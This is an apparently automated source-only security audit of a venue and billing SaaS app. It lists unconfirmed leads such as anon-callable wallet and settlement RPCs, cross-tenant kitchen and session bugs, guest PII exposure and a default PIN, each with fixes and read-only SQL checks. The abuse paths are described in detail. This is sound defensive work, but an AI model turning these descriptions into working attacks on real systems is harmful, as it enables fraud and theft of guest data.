# AUDIT_FULL_REPORT: Quad Computing

_Generated on 2026-10-20 by the Cloudflare `security-audit` skill (full audit mode, standard profile). Source ref `29027f4a64d464c071a27a3238fd069c45e42702`._

> **Read this first.** This is a source-only audit. The machine it ran on has no OS sandbox, so the skill's rules forbade running any of your code. Without a run, nothing can be **confirmed**, so every issue below is a **needs-validation lead with no severity**. "Priority" means only the order in which to check them. A PASS in the file inventory means no issue was found in a review of that file's source. It does not prove the file is secure.

## 1. Production readiness verdict

**NOT READY for launch until the P1 leads are checked and fixed.**

Nine P1 leads would each allow cross-tenant money changes, order changes or PII exposure if the deployed database matches the migrations in the repo.

Five of the nine are database-function exposures. The blanket `GRANT EXECUTE ON ALL FUNCTIONS ... TO anon, authenticated` in `supabase/migrations/20261006000004_database_merge_and_permissions_fix.sql:224-228`. Two money RPCs gate their ownership check on a legacy JWT setting, and submit_guest_order_atomic and provision_host_business have client grants with no caller binding. You can check these in about 15 minutes with the read-only SQL in section 3. If the checks come back true, one hardening migration fixes most of them (section 6).

The other four P1 leads are app-code tenant-scoping bugs, each with a small, contained fix:
- `settle-session.service.ts`
- `kitchen/create-ticket.service.ts`
- the guest order row exposure
- `init-session-helpers.util.ts`

Once P1 is fixed and re-tested, the remaining P2 and P3 items are standard post-launch hardening for a pilot, provided the owner accepts the operational assumptions noted for each one.

| Metric | Value |
|---|---|
| Files in scope (tracked, non-test) | 763 |
| Files reviewed by an owned check | 746 (98%) |
| Additional component/script files reviewed | 820 |
| Coverage units | 29 (12 covered, 17 candidate) |
| Agents | 4 recon + 23 hunters + 3 critics + 24 Phase-3 verifiers + 24 Phase-5 verifiers |
| Confirmed findings | 0 (no sandbox) |
| Needs-validation leads | 24 (P1 9 / P2 11 / P3 4) |
| Rejected | 0 |

## 2. Itemized findings (needs validation, ordered by priority)

Full traces, evidence and validation plans for each lead are in `NEEDS-VALIDATION.md` in the run folder.

| ID | Pri | Lead | Location (sink) | Who can do it | Suggested fix (patch summary) |
|---|---|---|---|---|---|
| NV-01 | P1 | Anon (and possibly any authenticated) caller can credit or drain any venue's platform wallet via deduct_venue_wallet_credits | `supabase/migrations/20261006000003_phase2b_subscription_billing_and_topup.sql:245` | Anonymous/any user could credit or drain any venue platform wallet | REVOKE ALL ON FUNCTION public.deduct_venue_wallet_credits(uuid,numeric,text,text) FROM PUBLIC, anon, authenticated and GRANT EXECUTE only TO service_role (the only app caller uses adminDb()). Also add IF p_amount IS NULL OR p_amount <= 0 THEN RETURN an error, replace the request.jwt.claim.role check with auth.role()/auth.uid(), and revoke the default-privilege EXECUTE grant to anon/authenticated from 20261006000004:228. |
| NV-02 | P1 | Anyone naming a venue and table label gets the open order's guest phone, name and id, and the id then unlocks the settled bill | `lib/services/guest-auth/guest-bills.service.ts:426` | Anyone naming venue+table gets guest phone/name and bill access | return a fixed column projection without customer_phone or customer_name from the guest order and session reads, and issue a per-device bill capability token when the order is placed instead of treating the order id as the secret. |
| NV-03 | P1 | Guest session init swaps the validated venue for whichever venue's table label matches first | `lib/services/guest-session/init-session.service.ts:108` | Guests can be attached to another venue table with the same label |  |
| NV-04 | P1 | Kitchen ticket accepts another venue's order_id, letting venue A staff cancel or mark served venue B's order | `supabase/migrations/20261006000001_update_kot_status_rpc.sql:173` | Venue A staff could cancel/serve venue B orders via a kitchen ticket | in createKitchenTicketRecord, when orderId/roomId is given, select it with .eq('business_id', businessId) and reject if missing; and in update_kot_status, restrict the orders/order_items sync and inventory deduction to rows whose business_id equals v_ticket.business_id. |
| NV-05 | P1 | Any authenticated user may be able to settle any venue's bill and mint guest cashback via execute_atomic_bill_settlement (ownership check gated on legacy JWT GUC) | `supabase/migrations/20261009000003_cashback_on_full_bill.sql:249` | Any signed-up user could settle any venue bill and mint guest cashback | replace the GUC gate with an unconditional check, IF COALESCE(auth.role(), '') <> 'service_role' AND (auth.uid() IS NULL OR NOT (p_business_id = ANY(public.get_auth_business_ids()))) THEN RAISE ... END IF; and preferably REVOKE EXECUTE FROM authenticated, keeping settlement on the server-side service-role path. Apply the same change to deduct_venue_wallet_credits. |
| NV-06 | P1 | provision_host_business trusts caller-supplied p_host_id, letting any authenticated user overwrite another user's profile name/gender/dob and plant businesses in their tenant | `supabase/migrations/20261006000010_provision_persist_email.sql:68` | Any signed-up user could overwrite another user profile and plant venues | at the top of the function, add IF auth.role() <> 'service_role' AND p_host_id IS DISTINCT FROM auth.uid() THEN RAISE EXCEPTION 'forbidden'; or derive the host id from auth.uid(), or REVOKE EXECUTE FROM authenticated and call it only with the service role. |
| NV-07 | P1 | Cashier at one venue can settle another venue's table: settlement takes the business from a session_id or table_id in the body | `lib/services/session/settle-session.service.ts:202` | Cashier of venue A could settle and vacate venue B tables | never reassign businessId from a looked-up row; add .eq('business_id', businessId) to the session-by-id, session-by-table_id and order-by-session_id lookups, clear resolvedTableId when the table check finds no row, and bind the RPC's session close, order update and checks to the caller's venue. |
| NV-08 | P1 | submit_guest_order_atomic is callable by any authenticated user for any venue with caller-chosen prices and totals | `supabase/migrations/20261016000012_guest_delivery.sql:163` | Any signed-up user could write orders/totals into any venue | REVOKE EXECUTE on the 17-argument signature FROM authenticated and grant it to service_role only, since the only caller is the server route using adminDb() (app/api/guest/order/route.ts:75, submit-order.service.ts:246); or recompute line prices and totals from catalog_items inside the function. |
| NV-09 | P1 | update_kot_status is anon-executable after the 20261006000004 blanket grant, allowing cross-venue KOT/order status changes | `supabase/migrations/20261006000001_update_kot_status_rpc.sql:189` | Anonymous caller could cancel/serve any venue order via KOT RPC | REVOKE ALL ON FUNCTION public.update_kot_status(uuid,text,uuid) FROM PUBLIC, anon, authenticated and GRANT EXECUTE TO service_role. Switch kitchen/tickets/route.ts:131 to adminDb().rpc after its existing venue-ownership check at :86-91, or add a p_business_id parameter bound to get_auth_business_ids(). Also drop the 20261006000004 ALTER DEFAULT PRIVILEGES function grant to anon and authenticated. |
| NV-10 | P2 | Legacy admin_pin DEFAULT '0000' still unlocks the master lock on venues that never set a PIN | `lib/services/security/venue-pin.ts:39` | Legacy venues may still accept master PIN 0000 | add a migration that sets admin_pin = NULL where admin_pin = '0000' and admin_pin_hash IS NULL; make checkPin/isPinSet and the legacy hashing script ignore legacy plain values that fail pinProblem; and have owners whose hash was derived from '0000' reset their PIN. |
| NV-11 | P2 | Guest PIN change/recovery only revokes the current venue; old PIN and other-venue sessions keep wallet access | `lib/services/guest-auth/wallet-ownership.ts:50` | Old guest PIN/sessions keep wallet access after PIN change | on PIN change/recovery update pin_hash/pin_salt (and reset lockout) on every guest_accounts row with the same user_id (or the same handle for legacy unlinked rows) and delete guest_auth_sessions for all of those account ids, ideally storing a single PIN per person. |
| NV-12 | P2 | Guest PIN lockout can be undercounted by concurrent guesses; the 'per handle' limit is keyed per IP+handle | `lib/services/guest-auth/guest-account.service.ts:207` | Guest 6-digit PIN lockout undercounts parallel guesses | count failures with an atomic SQL increment (for example an RPC doing UPDATE ... SET failed_attempts = failed_attempts + 1 ... RETURNING) and check the lock before verifying; key the per-handle limit on the handle alone; keep one lockout counter per person instead of one per venue copy of the PIN. |
| NV-13 | P2 | Anonymous event-interest submission with another guest's phone or email overwrites that guest's event lead and guest-ledger contact details | `supabase/migrations/20261016000009_event_gender_quotas.sql:51` | Anonymous RSVP overwrites another guest lead/ledger contact | for unauthenticated callers, build the key only from the submitted details and never resolve it into existing ledger rows. In record_event_interest, never overwrite guest_name, email or party of an existing lead or ledger row from an unverified submission: make it insert-only, or create a separate unverified lead. |
| NV-14 | P2 | Anonymous guest order accepts non-catalog lines at price 0 with a client-chosen name and sends them to the kitchen | `supabase/migrations/20261016000012_guest_delivery.sql:188` | Guests can add free, arbitrarily named dishes to a KOT | reject the order with 400 when any line's id is missing or not in catalogMap for the venue, check catalogRes.error, and always take the line name from the catalog row, never from the client. |
| NV-15 | P2 | Master-PIN section lock is enforced only by a client sessionStorage flag | `app/api/host/profile/update/route.ts:15` | Master-PIN lock on bank/UPI settings is client-side only | on a successful master-PIN verify, issue a short-lived HttpOnly signed 'pin-unlocked' cookie bound to the user and business, require it in the server guards for ALWAYS_LOCKED modules (profile/update, wallet and payment routes), and stop treating the sessionStorage flag as authority. |
| NV-16 | P2 | Kitchen PATCH falls back to an unchecked service-role status write when update_kot_status rejects a transition, with a client-chosen staff_id | `app/api/host/kitchen/tickets/route.ts:149` | Kitchen PATCH bypasses KOT state machine; forgeable staff_id | remove the direct-write fallback and return the RPC error (as lib/services/kitchen/update-ticket.service.ts:46-48 does), and derive staff_id only from auth.staff/auth.user. |
| NV-17 | P2 | Rate-limit client address taken from the client-supplied X-Forwarded-For header | `app/api/host/staff/verify-pin/route.ts:39` | IP rate limits keyed on client-controlled X-Forwarded-For | derive the client IP from a platform-trusted source (on Vercel, x-vercel-forwarded-for / x-real-ip set by the edge, or the rightmost XFF hop added by trusted ingress) behind an explicit TRUSTED_PROXY setting and ignore client XFF otherwise; also add a per-venue (IP-independent) cap on venue-PIN failures and a per-handle (IP-independent) guest login limit. |
| NV-18 | P2 | Staff PIN reset does not revoke existing staff sessions | `lib/auth/guards.ts:159` | Staff PIN reset does not end existing 12h staff sessions | add a staff_profiles.session_version (or pin_changed_at) column, sign it into the token at login, bump it in PUT /api/host/staff/access whenever pin, role or active changes, and make staffStillValid require it to match. |
| NV-19 | P2 | Cancelling one KOT ticket voids every line of the table's order, letting a waiter free a table with served food unpaid | `lib/services/session/release-table.service.ts:45` | Cancelling one KOT round voids the whole bill; table freed unpaid | in update_kot_status sync only the order_items that belong to this ticket (store kitchen_ticket_id on order_items, or match the ticket's own lines), never change orders.status because one ticket was cancelled, and refuse CANCELLED from staff when any line on the ticket is past pending. |
| NV-20 | P2 | CASHIER staff can read P&L, dues, guest and booking data through the Vibey co-pilot beyond their role allowlist | `lib/vibey/host/tools-money.ts:32` | Cashier reads P&L, dues, guests via Vibey co-pilot | give each ToolDef the staff roles allowed to use it (e.g. CASHIER: live_tables, find_invoice only), drop disallowed calls for auth.staff in the gate node, and add delivery/reservations to DEFAULT_LOCKS or treat unknown modules as locked for staff. |
| NV-21 | P3 | Club dev shortcuts (unauthenticated dev-bypass, auto-approval, OTP 123456) reachable on the 0.0.0.0-bound dev server | `app/api/club/dev-bypass/route.ts:55` | Club dev shortcuts reachable on LAN-bound dev server | require an explicit opt-in flag (e.g. CLUB_DEV_BYPASS=1), a signed-in session and a loopback-only Host for every dev shortcut; remove the listUsers fallback; bind the dev script to 127.0.0.1. |
| NV-22 | P3 | Club NOC action returns an existing certificate to any approved member before the creator/staff check | `lib/club/ledger/noc.service.ts:23` | Club NOC certificate readable by any approved member | in issueNoc, load the event and enforce `isStaff \|\| event.creator_id === actorId` (or deal owner, matching eventView) before the existing-row lookup returns. |
| NV-23 | P3 | A host can save settled POS bills without the per-bill platform fee by sending a table/room id or a non-SETTLED status | `app/api/host/orders/create/route.ts:65` | Host can skip the per-bill platform fee | charge the fee for every order this route leaves in a closed status (SETTLED or COMPLETED) when body.settlement is absent, keyed by feeReferenceFor(order.id) so a later settlement or status change stays idempotent. Alternatively, treat a bill as a table or room bill only after verifying an open session or stay for that venue. |
| NV-24 | P3 | Host dashboard 'Export CSV' writes guest-typed names without formula neutralization (CSV/formula injection) | `components/host/workspaces/dashboard/reports/report-csv.ts:46` | Dashboard CSV export lacks formula-injection guard | make report-csv.ts use csvCell from lib/utils/csv.ts (apostrophe-prefix non-numeric text starting with = + - @ tab or CR, and also quote CR), and add a case to report-csv.test.ts with a top guest named '=1+1'. |

### Detail per lead

#### NV-01 [P1]: Anon (and possibly any authenticated) caller can credit or drain any venue's platform wallet via deduct_venue_wallet_credits

- **Fingerprint:** `qc/deduct_venue_wallet_credits/negative-amount-credit-and-anon-grant`
- **Entry → sink:** `supabase/migrations/20261006000004_database_merge_and_permissions_fix.sql:224` → `supabase/migrations/20261006000003_phase2b_subscription_billing_and_topup.sql:245`
- **What:** deduct_venue_wallet_credits is a SECURITY DEFINER RPC that takes a caller-chosen p_venue_id and p_amount. Migration 20261005000002:70-72 revoked EXECUTE on all functions from anon, and 20261006000003:264-265 revoked this function from PUBLIC and anon. Then 20261006000004:224 runs GRANT EXECUTE ON ALL FUNCTIONS IN SCHEMA public TO anon, authenticated. That re-opens the function to anon, and no later migration or supabase/*.sql script revokes it. Inside the function, the ownership check runs only when current_setting('request.jwt.claim.role', true) = 'authenticated' (:185-186). An anon caller therefore skips it whatever the GUC holds. An authenticated caller skips it if the deployed PostgREST sets only request.jwt.claims and not the legacy per-claim GUC. p_amount has no sign check. The only guard is v_current_balance < p_amount (:234), so a negative amount passes, and :243-248 sets balance = current - p_amount, which raises the balance. A positive amount up to the current balance drains another venue's prepaid platform credit. With p_reference_id NULL the idempotency check is skipped, so the call can be repeated. Correction to the hunter: dropping chk_bal (20261006000003:19) is not needed for the credit. A CHECK (balance >= 0) never blocks an increase, and a drain is already bounded by the balance check. Separately, 20261008000005:10 says 20261005000003, which added chk_bal, was never applied live. Grants and current-version function bodies are fully source-visible. Still undetermined: whether the hand-applied 20261006000004 grant lines took effect on the deployed database, whether an out-of-repo revoke exists, and which JWT GUCs the deployed PostgREST sets.
- **Blockers:** No OS-enforced sandbox (network-isolated, empty-env, read-only target, resource-limited) is available on the audit host, so the bounded local observation could not be run. / Migrations are applied by hand (20261008000005:4-14). Lines 11-13 imply 20261006000004 was executed live, but the repository does not show whether its GRANT lines took effect on the deployed database, or whether an out-of-repo revoke exists for deduct_venue_wallet_credits. / Whether the deployed PostgREST sets the legacy request.jwt.claim.role GUC is not source-visible. It decides only the authenticated-caller variant; the anon variant skips the check regardless.
- **Owner check:** Read-only checks for the owner in the Supabase SQL editor: (a) SELECT has_function_privilege('anon', 'public.deduct_venue_wallet_credits(uuid,numeric,text,text)', 'EXECUTE') AS anon_exec, has_function_privilege('authenticated', 'public.deduct_venue_wallet_credits(uuid,numeric,text,text)', 'EXECUTE') AS auth_exec; (b) SELECT pg_get_functiondef('public.deduct_venue_wallet_credits(uuid,numeric,text,text)'::regprocedure); to confirm the deployed body matches 20261006000003:163-262; (c) SELECT conname, pg_get_constraintdef(oid) FROM pg_constraint WHERE conrelid = 'public.venue_wallets'::regclass;. Do not call the RPC against production. If anon_exec is true, apply the revoke immediately.
- **Remediation:** REVOKE ALL ON FUNCTION public.deduct_venue_wallet_credits(uuid,numeric,text,text) FROM PUBLIC, anon, authenticated and GRANT EXECUTE only TO service_role (the only app caller uses adminDb()). Also add IF p_amount IS NULL OR p_amount <= 0 THEN RETURN an error, replace the request.jwt.claim.role check with auth.role()/auth.uid(), and revoke the default-privilege EXECUTE grant to anon/authenticated from 20261006000004:228.

#### NV-02 [P1]: Anyone naming a venue and table label gets the open order's guest phone, name and id, and the id then unlocks the settled bill

- **Fingerprint:** `qc/guest-order/open-order-row-and-id-exposed-by-table-label`
- **Entry → sink:** `app/api/guest/order/route.ts:21` → `lib/services/guest-auth/guest-bills.service.ts:426`
- **What:** GET /api/guest/order (re-exported unchanged as /api/orders) needs only a venue id and a table label matching /^[A-Za-z0-9 -]{1,12}$/. Table labels are usually short and easy to guess. getGuestActiveOrder itself requires the venue id to be a UUID. There is no QR secret and no caller identity. The handler runs on the service-role client and returns the table's newest open orders row via select('*'), which includes customer_name, customer_phone and the order id, plus all order_items. The only limit is a 1500/min venue-wide rate limit. The settled-bill paths treat knowing that order id as proof of being in the party. GET /api/guest/bill (loadSettledOrderBill) returns the full invoice for 48h after settlement, with items, totals, GST and guest_name but not the phone. known_order on GET /api/guest/order returns the settled total and the credited cashback for 2h. So a remote caller who polls a table while its order is open can collect the guest's phone and name, and can later read that party's invoice and cashback. POST /api/guest/session returns the same full row through resolveOrInitMasterOrder.
- **Blockers:** No OS-enforced sandbox (network-isolated, empty-env, read-only target, resource-limited) is available on the audit host, so the bounded local observation could not be run. / The product's intended table-possession model (anyone holding the venue id and table label counts as the party, with no QR secret) and whether customer_phone is populated on dine-in orders in production need owner confirmation.
- **Owner check:** As owner, read-only in staging: run select count(*) filter (where customer_phone is not null), count(*) from orders where status not in closed statuses and table_number not like delivery numbers, to see how often dine-in open orders carry a phone. Confirm whether any guest UI uses orders columns beyond id, status, totals and session_id, and whether table possession is meant to be proven by more than the venue id and label.
- **Remediation:** return a fixed column projection without customer_phone or customer_name from the guest order and session reads, and issue a per-device bill capability token when the order is placed instead of treating the order id as the secret.

#### NV-03 [P1]: Guest session init swaps the validated venue for whichever venue's table label matches first

- **Fingerprint:** `qc/guest-session/table-lookup-drops-validated-venue`
- **Entry → sink:** `app/api/guest/session/route.ts:21` → `lib/services/guest-session/init-session.service.ts:108`
- **What:** POST /api/guest/session validates venue A and writes it to body.business_id (app/api/guest/session/route.ts:21-25), then calls initializeGuestSession (line 34). validateGuestAccess resolves the venue identifier to an existing business (lib/auth/guest-validate.ts:31, via resolveBusinessId) and checks the table label format (lines 38-52), but it never checks that the label exists at venue A. Both shipped POST callers send table_number and business_id and never table_id: components/guest/menu/hooks/guest-menu-fetch.util.ts:37-45 and components/guest/lobby/LobbyUsernameModal.tsx:31-36. So resolvedTableId stays null and the guard at lib/services/guest-session/init-session-helpers.util.ts:7 is true. The restaurant_tables query at lines 9-11 filters only by table-label variants, has no business_id predicate and no ORDER BY, and takes limit(1). Line 12 then overwrites targetBizId with the matched row's business_id, which may be venue B. Later steps trust venue B: the session lookup and insert (init-session.service.ts:17-19, 37-42), the orders reads in resolveOrInitMasterOrder (helpers lines 23 and 30, select('*')), the order_items read (service line 56) and the in-memory KOT lookup (service line 66). The response (service lines 108-118) can return venue B's session, its open orders row (customer_name, customer_phone, id) and its order_items to a guest who scanned at venue A. The client then sends activeSession.business_id as business_id on order POSTs (components/guest/menu/hooks/useGuestOrderDispatch.ts:47) and bill-request PATCHes (line 90). The order route resolves the venue from query cafe_id or body.business_id (app/api/guest/order/route.ts:56), so an honest guest's order is validated for venue B and placed for venue B's table number. The session PATCH resolves the venue the same way (app/api/guest/session/route.ts:70), and update-session.service.ts:26 filters by session id and business_id, so a bill request updates venue B's session row. The swap happens whenever the unordered limit(1) returns a row from a venue other than the validated one, including when venue A has no row with that label. The schema allows shared labels: the unique index is per business (supabase/migrations/20261005000002_rls_lockdown.sql:11), and the migration 20261006000004 seeds T-01 to T-04 for one fixed venue (lines 231-288), so the repository does not show a second venue with the same labels. Whether a shared label occurs in deployed data is unknown. Calibration: GET /api/guest/order already returns the venue's open orders row (lib/services/guest-order/get-order.service.ts:28, 41, 126) to anyone who names a venue UUID and table label, and the public menu response carries the venue id (guest-menu-fetch.util.ts:27). The confidentiality gain from the swap is therefore small. The distinct harm is cross-venue integrity for honest guests (orders, bill requests and sessions created under the wrong venue), plus venue B's order PII reaching an unintended device. The GET /api/guest/session read path also lacks venue predicates; that is a separate root cause with its own entrypoint and fix and is not part of this record.
- **Blockers:** No OS-enforced sandbox (network-isolated, empty-env, read-only target, resource-limited) is available on the audit host, so the bounded local observation could not be run. / Whether the unordered restaurant_tables limit(1) returns a row from another venue depends on deployed physical row order and on whether table labels are shared across venues in deployed data. This includes the case where the validated venue has no row with that label. Neither can be observed from source.
- **Owner check:** As the owner, in a read-only session, run BEGIN; SET TRANSACTION READ ONLY; then only these SELECT statements; then ROLLBACK. (1) SELECT table_number, count(DISTINCT business_id) AS venues FROM restaurant_tables GROUP BY table_number HAVING count(DISTINCT business_id) > 1; this lists exact labels shared by more than one venue. (2) For the label '1' and each other label reported by (1), using the variant set the application builds for it (for '1': '1', '01', 'T-1', 'T-01', 'Table 1', 'Table 01'): SELECT id, business_id, table_number FROM restaurant_tables WHERE table_number IN ('1', '01', 'T-1', 'T-01', 'Table 1', 'Table 01') ORDER BY business_id; this lists every venue that has a row for that label. (3) Run SELECT id, business_id FROM restaurant_tables WHERE table_number IN ('1', '01', 'T-1', 'T-01', 'Table 1', 'Table 01') LIMIT 1 three times, which is the unordered lookup the application runs without its business filter, to see whether the returned business_id is stable. Venues listed in (2) whose business_id differs from the business_id returned in (3) are the venues whose guests the code would route to the returned venue. Do not write, delete, or send any request to the application.
- **Remediation:** see NEEDS-VALIDATION.md

#### NV-04 [P1]: Kitchen ticket accepts another venue's order_id, letting venue A staff cancel or mark served venue B's order

- **Fingerprint:** `qc/kitchen-ticket/foreign-order-id-status-sync`
- **Entry → sink:** `app/api/host/kitchen/tickets/route.ts:39` → `supabase/migrations/20261006000001_update_kot_status_rpc.sql:173`
- **What:** POST /api/host/kitchen/tickets stores a body-supplied orderId on a new ticket of the caller's venue without checking that the order belongs to that venue (the FK on kitchen_tickets.order_id only checks existence, and no trigger on kitchen_tickets exists in the migrations). A later PATCH only checks the ticket's business_id, then the SECURITY DEFINER update_kot_status rewrites orders.status and order_items.kot_status of the linked order by order_id alone (and calls deduct_recipe_inventory_for_order on SERVED). A venue-A PIN staff member (WAITER/CHEF/CASHIER, whose route client is the service-role adminDb()) or a venue-A owner (update_kot_status is re-granted to authenticated by the later blanket GRANT EXECUTE ON ALL FUNCTIONS in 20261006000004:224) who knows a venue-B order UUID can drive that order to 'cancelled' or 'served' unless it is already settled/closed. Knowing the UUID is a precondition (e.g. the attacker's own order placed as a guest at B).
- **Blockers:** No OS-enforced sandbox (network-isolated, empty-env, read-only target, resource-limited) is available on the audit host, so the bounded local observation could not be run. / No local Postgres/Supabase is available, so it could not be observed that the deployed schema has no trigger or constraint tying kitchen_tickets.order_id to the same business and that the deployed update_kot_status matches this migration.
- **Owner check:** Owner runs read-only in the production SQL editor: SELECT count(*) FROM kitchen_tickets k JOIN orders o ON o.id = k.order_id WHERE o.business_id IS DISTINCT FROM k.business_id; SELECT tgname FROM pg_trigger WHERE tgrelid = 'public.kitchen_tickets'::regclass AND NOT tgisinternal; and SELECT pg_get_functiondef('public.update_kot_status(uuid,text,uuid)'::regprocedure) to confirm the deployed function has no business_id predicate on the orders/order_items sync. A non-zero count, or no same-business trigger plus an unchanged function body, confirms reachability.
- **Remediation:** in createKitchenTicketRecord, when orderId/roomId is given, select it with .eq('business_id', businessId) and reject if missing; and in update_kot_status, restrict the orders/order_items sync and inventory deduction to rows whose business_id equals v_ticket.business_id.

#### NV-05 [P1]: Any authenticated user may be able to settle any venue's bill and mint guest cashback via execute_atomic_bill_settlement (ownership check gated on legacy JWT GUC)

- **Fingerprint:** `qc/money-rpcs/legacy-jwt-claim-role-authz-skip`
- **Entry → sink:** `supabase/migrations/20261009000003_cashback_on_full_bill.sql:302` → `supabase/migrations/20261009000003_cashback_on_full_bill.sql:249`
- **What:** The final definition of the SECURITY DEFINER RPC execute_atomic_bill_settlement (20261009000003, the last migration that redefines it) is granted EXECUTE to authenticated (:302). Its owner/staff check (:57-77) runs only when current_setting('request.jwt.claim.role', true) equals 'authenticated' (:56), and it is also skipped silently when auth.uid() is NULL (:64). The repository does not set or pin the PostgREST version or its db-use-legacy-gucs setting, and recent PostgREST versions may expose JWT claims only through the JSON GUC request.jwt.claims rather than the per-claim legacy GUCs. The repo's own RLS harness simulates a user with request.jwt.claims alone (rls_tests.sql:38). If the deployed PostgREST does not set the legacy GUC, v_caller_role is NULL and no ownership check runs. Any signed-up Supabase user could then call /rpc/execute_atomic_bill_settlement for any p_business_id. Guests now sign up with Supabase accounts (20261010000019:3-7), so that is any guest. With p_order_id NULL the order and once-per-order checks (:84, :232) do not apply. Each call credits 7% of a caller-chosen p_subtotal (:228-229) to any guest_id wallet at that venue, creating the wallet if needed (:245) or adding to it (:249). The idempotency_key unique index (20261006000007:22-23) is not used by this RPC, so repeated calls keep crediting. With a real order UUID of the target venue, the caller can also overwrite its billing fields and items (:109-137), mark it settled at the caller's p_grand_total (:276-279), close the session (:270) and vacate the table (:283-286). deduct_venue_wallet_credits (20261006000003:185-203) uses the same gate. It is tracked under its own candidate. Source supports the trace. Whether the deployed PostgREST populates request.jwt.claim.role is the decisive fact still unknown.
- **Blockers:** No OS-enforced sandbox (network-isolated, empty-env, read-only target, resource-limited) is available on the audit host, so the bounded local observation could not be run. / Whether the deployed PostgREST populates the legacy per-claim GUC request.jwt.claim.role (db-use-legacy-gucs or version-dependent behavior) is a deployment fact not visible in source. If it is populated, the ownership check runs and the cross-venue path is closed.
- **Owner check:** Owner-observed on a staging project only, never on production or against real venues. Staging should run the same PostgREST version and API settings as production. The owner creates a throwaway SECURITY INVOKER function on staging that returns current_setting('request.jwt.claim.role', true) and current_setting('request.jwt.claims', true)::jsonb->>'role', calls it through /rest/v1/rpc with an ordinary non-owner user JWT, then drops it. If the first value is NULL and the second is 'authenticated', the ownership checks in execute_atomic_bill_settlement and deduct_venue_wallet_credits are skipped on that configuration. For production, the owner only reads the PostgREST version and the db-use-legacy-gucs setting from the hosted project settings, if those settings expose them, without creating any object, and confirms they match staging. Also run the read-only query SELECT has_function_privilege('authenticated', 'public.execute_atomic_bill_settlement(text,text,text,uuid,numeric,numeric,numeric,text,text,text,text,jsonb)', 'EXECUTE') on production to confirm the grant is live. Do not call the settlement RPC against real venues or create objects in production.
- **Remediation:** replace the GUC gate with an unconditional check, IF COALESCE(auth.role(), '') <> 'service_role' AND (auth.uid() IS NULL OR NOT (p_business_id = ANY(public.get_auth_business_ids()))) THEN RAISE ... END IF; and preferably REVOKE EXECUTE FROM authenticated, keeping settlement on the server-side service-role path. Apply the same change to deduct_venue_wallet_credits.

#### NV-06 [P1]: provision_host_business trusts caller-supplied p_host_id, letting any authenticated user overwrite another user's profile name/gender/dob and plant businesses in their tenant

- **Fingerprint:** `qc/provision_host_business/missing-auth-uid-binding`
- **Entry → sink:** `supabase/migrations/20261006000010_provision_persist_email.sql:104` → `supabase/migrations/20261006000010_provision_persist_email.sql:68`
- **What:** The final provision_host_business (the 14-argument version, never redefined after 20261006000010) is SECURITY DEFINER and granted EXECUTE to authenticated (:104-106). It never compares p_host_id with auth.uid(). Its only identity check is p_host_id IS NOT NULL (:45). The app route binds p_host_id to the session user (app/api/host/provision/route.ts:20,36), but any authenticated Supabase user can call /rest/v1/rpc/provision_host_business directly with the public anon key and their own JWT. An attacker who knows a victim's auth user id can do two things. First, overwrite the victim's profiles.full_name, gender and dob through ON CONFLICT DO UPDATE (:52-57). owner_cafe_id and email use COALESCE, and role is not in the update set, so those values are not overwritten when they already exist. If the victim has no profile row yet, the call creates one with role 'host'. Second, insert businesses and locations with host_id = victim, each with a 1000.00 venue wallet and an active subscription (:68-89). Through get_auth_business_ids() and the owner RLS policies, these join the victim's tenant set and business list, and they can become the default businesses[0] in requireHost. The attacker gets no read access to the victim's data. The impact is integrity: unauthorized profile mutation and unwanted venues planted in the victim's tenant.
- **Blockers:** No OS-enforced sandbox (network-isolated, empty-env, read-only target, resource-limited) is available on the audit host, so the bounded local observation could not be run. / The attacker needs the victim's auth user id. Which surfaces expose host or user UUIDs to other users is outside this SQL slice. / Whether the deployed database's effective ACL and function body match the migrations (20261006000010 being the last definition) cannot be observed from source alone.
- **Owner check:** The owner runs read-only catalog checks on the deployed database: SELECT has_function_privilege('authenticated', 'public.provision_host_business(uuid,text,text,date,text,text[],text,text,text,text,text,text,text,text)', 'EXECUTE'); and SELECT pg_get_functiondef('public.provision_host_business'::regproc); to confirm the grant and the missing auth.uid() check. The owner also checks whether any client-visible API response exposes other users' host or auth UUIDs. Do not call the RPC against production.
- **Remediation:** at the top of the function, add IF auth.role() <> 'service_role' AND p_host_id IS DISTINCT FROM auth.uid() THEN RAISE EXCEPTION 'forbidden'; or derive the host id from auth.uid(), or REVOKE EXECUTE FROM authenticated and call it only with the service role.

#### NV-07 [P1]: Cashier at one venue can settle another venue's table: settlement takes the business from a session_id or table_id in the body

- **Fingerprint:** `qc/settle-session/session-lookup-overrides-caller-business`
- **Entry → sink:** `app/api/host/sessions/route.ts:71` → `lib/services/session/settle-session.service.ts:202`
- **What:** PATCH /api/host/sessions forces body.business_id to the caller's venue, but passes the body's session_id or table_id unchecked to settleAndVacateSession. That function loads the dine_in_session by id (or the latest live session by table_id) with no business filter and then replaces businessId with the session's business_id (settle-session.service.ts lines 97-98 and 100-103). It then looks up the order by session_id with no business filter (line 121). For a staff PIN session, requireHost returns supabase = adminDb() (guards.ts line 136), and CASHIER may PATCH /api/host/sessions (staff-roles.ts line 36). WAITER is limited to request_bill, release and waiter_settle by route.ts line 89. Because the call uses the service role, execute_atomic_bill_settlement skips its auth.uid ownership check, which runs only for the 'authenticated' JWT role (migration line 57). Its order and session checks (lines 84-102) compare against the overwritten p_business_id, so they pass. By source, the result is that venue B's order is marked settled with a grand_total the attacker chooses (migration lines 275-279). B's session is closed (lines 269-273) and B's table is set VACANT (lines 282-287). Afterwards the app charges B the platform fee (line 310), deducts inventory for B's order (line 296), closes B's stray sessions and records a ledger visit for B. The venue-suspension guard and GST status are still read for the caller's own venue (line 42), because those reads start before businessId is overwritten. Session ids are not secret: anonymous POST /api/guest/session runs with adminDb and returns the full session row, including id, table_id and business_id, for any venue and table label. An owner signed in through Supabase Auth is not affected the same way. If the owner client is RLS-scoped, the RPC's auth.uid check would reject p_business_id = B.
- **Blockers:** No OS-enforced sandbox (network-isolated, empty-env, read-only target, resource-limited) is available on the audit host, so the bounded local observation could not be run. / Whether the deployed execute_atomic_bill_settlement (12-argument jsonb signature) matches migration 20261009000003, including its 'authenticated'-only ownership gate, and whether the deployed build runs the current settle-session.service.ts, is not observable from source alone.
